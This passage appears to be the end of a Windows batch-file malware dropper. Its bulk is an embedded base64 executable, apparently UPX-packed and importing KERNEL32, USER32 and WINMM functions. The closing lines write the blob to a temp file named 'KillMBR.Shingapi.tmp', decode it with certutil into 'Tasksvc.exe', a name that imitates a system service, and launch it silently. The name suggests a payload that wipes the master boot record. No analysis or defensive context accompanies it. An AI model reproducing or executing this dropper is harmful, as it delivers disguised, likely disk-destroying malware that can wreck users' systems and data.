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
g/38dg+KAkKIB0dJdffpY////5CLAoPCBIkHg8cEg+kEd/EBz+lM////Xon3uSQB
AACKB0cs6DwBd/eAPwJ18osHil8EZsHoCMHAEIbEKfiA6+gB8IkHg8cFiNji2Y2+
AKAAAIsHCcB0PItfBI2EMADAAAAB81CDxwj/lmTAAACVigdHCMB03In5V0jyrlX/
lmzAAAAJwHQHiQODwwTr4f+WaMAAAIuucMAAAI2+APD//7sAEAAAUFRqBFNX/9WN
h58BAACAIH+AYCh/WFBUUFNX/9VYjZ4A8P//jbuhxQAAVzHAqllJUGoBU//RYY1E
JIBqADnEdfqD7IDpQE3//+saVr4EkEAA/K2FwHQNagNZ/3QkEOL6/9Dr7l7CDAAA
2MVAAPPFQAA4cEAA9MVAAAAAAAAAAAAAAAAAAaBAABygQAA4cEAABJBAAAAAAAAA
AAAAAKDFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAJDQAABk0AAAAAAAAAAAAAAAAAAA
ndAAAHjQAAAAAAAAAAAAAAAAAACo0AAAgNAAAAAAAAAAAAAAAAAAALPQAACI0AAA
AAAAAAAAAAAAAAAAAAAAAAAAAADc0AAAvtAAAMzQAADq0AAAAAAAAPrQAAAAAAAA
ANEAAAAAAAAM0QAAAAAAAEtFUk5FTDMyLkRMTABtc3ZjcnQuZGxsAFVTRVIzMi5k
bGwAV0lOTU0uRExMAAAAAEV4aXRQcm9jZXNzAAAAR2V0UHJvY0FkZHJlc3MAAExv
YWRMaWJyYXJ5QQAAVmlydHVhbFByb3RlY3QAAF9pb2IAAFNob3dXaW5kb3cAAHdh
dmVPdXRPcGVuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
DgAAAC5laF9mcmFtZQA=
) do (echo %%a>>%temp%\KillMBR.Shingapi.tmp)
certutil -decode "%temp%\KillMBR.Shingapi.tmp" "Tasksvc.exe" >NUL 2>NUL
start "" Tasksvc.exe
goto :eof